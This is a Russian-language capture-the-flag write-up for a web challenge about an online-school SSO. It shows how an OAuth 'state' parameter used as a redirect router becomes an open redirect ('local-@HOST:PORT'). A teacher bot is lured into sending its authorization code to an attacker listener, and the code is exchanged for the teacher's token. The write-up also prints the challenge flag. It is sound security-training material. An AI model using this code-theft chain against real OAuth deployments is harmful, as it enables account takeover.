# Стекадемия

**Категория:** Web
**Сложность:** easy
**Флаг:** `SOLARCTF{st4te_1s_n0t_a_r0ut3r}`

## Дано

Онлайн-школа (`online-school.solarctf.ru`) с ролями ученик/препод и SSO-авторизацией. Цель: получить роль `teacher`, чтобы прочитать `/api/exam-answers`, доступ к которому проверяется на сервере по роли.

## Что не сработало

Перед тем как найти настоящую дырку, перепробовал стандартный набор:

- Подделка JWT. Токен HS256, подпись реально проверяется, `alg: none` и отсутствие подписи сразу отбиваются. Секрет не подобрался по быстрому словарю.
- Mass assignment поля `role` через `/sso/register` и `PATCH /api/profile`. Сервер просто игнорирует это поле.
- Поиск XSS. `app.js` аккуратно эскейпит все, что рендерит, ни reflected, ни DOM XSS не завелось.
- Подмена `redirect_uri` в SSO. Проверяется строгим сравнением, левые хосты не проходят.
- Инъекция subject через `login_hint`/`username`/`sub`. Не подействовало, поддерживается только обычный `authorization_code` grant.

Отдельно нашел broken access control в `/api/questions` (список вопросов отдается всем подряд без проверки роли), но флага там не было, это просто побочная находка.

## Настоящая дырка

В `app.js`, в функции `handleCallback()` на `/login`, параметр `state` используется не как случайный токен против CSRF, а как самый настоящий роутер. Если `state` начинается с `local`, код делает:

```js
window.location.replace("http://localhost:" + state.split("-")[1] + "/login" + location.search)
```

То есть сервер просто форвардит auth `code` на хост, который берет из своего же параметра `state`. Если собрать `state` вида `local-@HOST:PORT`, получаем редирект на `http://localhost:@HOST:PORT/login?code=...`, а это уже чистый open redirect на произвольный хост (классический трюк с `@` в URL).

Дальше нужно было доставить такую ссылку залогиненному преподу. В форме поддержки есть вопросы, которые открывает бот-препод (`m.kovaleva`), причем открывает их в своей живой SSO-сессии. Если бот кликает по ссылке на `/sso/auth` с нашими параметрами, SSO выписывает код авторизации уже на его аккаунт, а не на мой.

## Цепочка эксплойта

1. Собираю `/sso/auth?...&redirect_uri=.../login&state=local-@<мой_хост>:<порт>&code_challenge=<свой>`.
2. Отправляю эту ссылку как вопрос в поддержку.
3. Бот-препод открывает ссылку своей сессией, SSO возвращает код на мой листенер (через open redirect из `state`).
4. На листенере ловлю код и сразу меняю его на токен на `/sso/token`, используя свой `code_verifier`.
5. Получаю JWT препода, хожу на `/api/exam-answers`, там флаг.

## Технические мелочи по инфраструктуре

Решалось все с Windows-машины с локальным MITM-прокси на `127.0.0.1:10809` (VPN), который по умолчанию ломает curl-запросы на localhost, пришлось его явно обходить для локальных вызовов. Git Bash еще и сам портит пути вида `/api/...`, превращая их в Windows-пути, лечится через `MSYS_NO_PATHCONV=1`.

Для листенера нужен был публичный адрес, доступный боту. Бесплатные туннели добавляли в адрес дефисы (вида `client-id.service.com`), а `state.split("-")` на это ломался, плюс часть туннелей показывает промежуточную страницу-предупреждение перед редиректом, что рвет цепочку. Решение: туннель в режиме чистого TCP с проброс по IP (`http://<edge-ip>:<port>`), без дефисов в адресе и без прослоек.

## Вывод

Красивая задача на тему "state это не просто случайная строка, а то, что с ней на самом деле делает код". Вся защита OAuth-флоу (строгий redirect_uri, проверка JWT, PKCE) была настроена правильно, пробита она была через побочную функцию, которая вообще не задумывалась как часть auth-логики.
